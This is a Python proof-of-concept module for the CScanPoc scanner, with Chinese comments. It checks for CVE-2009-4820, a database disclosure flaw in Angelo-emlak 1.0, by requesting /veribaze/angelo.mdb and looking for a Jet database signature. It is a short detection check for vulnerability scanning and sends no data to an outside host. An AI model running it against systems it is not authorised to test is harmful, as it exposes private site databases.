# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re


class Vuln(ABVuln):
    vuln_id = 'Angelo-emlak_0000'  # 平台漏洞编号
    name = 'Angelo-emlak 1.0 - Database Disclosure'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INFO_LEAK  # 漏洞类型
    disclosure_date = '2010-04-27'  # 漏洞公布时间
    desc = '''
        Angelo-Emlak在web根目录下保存敏感信息，但缺乏足够的访问控制，远程攻击者可以通过直接向veribaze/angelo.mdb发出请求，下载数据库
        Angelo-emlak 1.0数据库泄漏。
    '''  # 漏洞描述
    ref = 'http://www.cnvd.org.cn/flaw/show/CNVD-2010-4742'
    cnvd_id = 'CNVD-2010-4742'  # cnvd漏洞编号
    cve_id = 'CVE-2009-4820 '  # cve编号
    product = 'Angelo-emlak'  # 漏洞组件名称
    product_version = '1.0'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'b09e912d-3d1a-4cf0-8948-c18f37c49b29'  # 平台 POC 编号
    author = '国光'  # POC编写者
    create_date = '2018-06-01'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            vul_url = arg + '/veribaze/angelo.mdb'
            response = requests.get(vul_url).text

            if re.search('Standard Jet DB', response):
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
